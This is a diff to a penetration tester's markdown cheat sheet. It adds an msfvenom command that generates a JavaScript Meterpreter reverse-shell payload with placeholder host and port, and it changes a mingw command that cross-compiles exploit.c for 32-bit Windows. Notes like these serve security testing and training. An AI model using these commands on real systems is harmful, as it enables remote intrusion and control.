@@ -1,8 +1,14 @@
 # Notes
 
+### JS Meterpreter Payload
+```
+msfvenom -p <payload > LHOST=<ip> LPORT=<port> -f js_le -e generic/none
+```
+
+
 ### Compile on Linux for Windows x86
 ```
-x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
 ```
 
 ### From MSSQL Injection to RCE
